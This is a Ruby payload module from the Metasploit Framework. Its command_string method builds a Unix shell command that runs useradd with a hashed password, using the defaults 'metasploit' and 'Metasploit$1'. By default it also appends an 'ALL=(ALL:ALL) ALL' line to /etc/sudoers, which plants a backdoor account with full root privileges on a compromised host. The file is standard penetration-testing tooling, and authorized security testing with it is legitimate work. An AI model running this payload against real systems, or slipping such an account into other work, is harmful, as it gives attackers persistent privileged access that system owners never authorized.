##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 8

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Add user with useradd',
        'Description' => 'Creates a new user and adds them to sudo if desired',
        'Author' => 'Nick Cottrell <Rad10Logic>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::None,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'generic',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
      )

    register_options(
      [
        OptString.new('USER', [ true, 'The username to create', 'metasploit' ]),
        OptString.new('PASS', [ true, 'The password for this user', 'Metasploit$1' ]),
        OptBool.new('SUDOERS', [false, 'Add new user to sudoers as well', true])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    return "useradd #{datastore['USER']} -p #{datastore['PASS'].crypt('Az')}" + if datastore['SUDOERS']
                                                                                  ";echo \"#{datastore['USER']} ALL=(ALL:ALL) ALL\">>/etc/sudoers"
                                                                                else
                                                                                  ''
                                                                                end
  end
end
